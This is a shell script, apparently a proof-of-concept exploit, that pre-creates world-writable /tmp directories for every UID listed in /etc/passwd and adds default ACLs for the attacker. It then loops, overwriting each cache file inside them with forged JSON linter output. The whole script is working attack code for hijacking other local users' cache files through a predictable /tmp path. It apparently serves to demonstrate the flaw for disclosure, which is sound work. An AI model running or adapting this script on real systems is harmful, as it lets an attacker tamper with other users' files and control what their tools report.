#!/bin/sh
set -e -u
cd /tmp
uids=$(cut -d: -f3 /etc/passwd | sort -u)
mkdir -m 777 $uids || {
    printf '%s: Failed to pre-create some /tmp/$UID directories. Maybe try again after reboot?\n' "$0" >&2
    exit 1
}
setfacl -d -m "u:$USER:rwx" $uids || {
    printf '%s: This exploit requires ACLs to work. Sorry!\n' >&2
    exit 1
}
## Past this point, we have write permissions to all cache files.
## We can replace them with our own contents.
export json='[{"severity":"error","location":{"begin_pos":0,"end_pos":0},"message":"No, /tmp is not an appropriate location for cache","cop_name":"Syntax","status":"uncorrected"}]'
while true
do
    find $uids -type f -exec sh -c 'printf "%s" "$json" > "$1"' - {} \;
    sleep 1
done
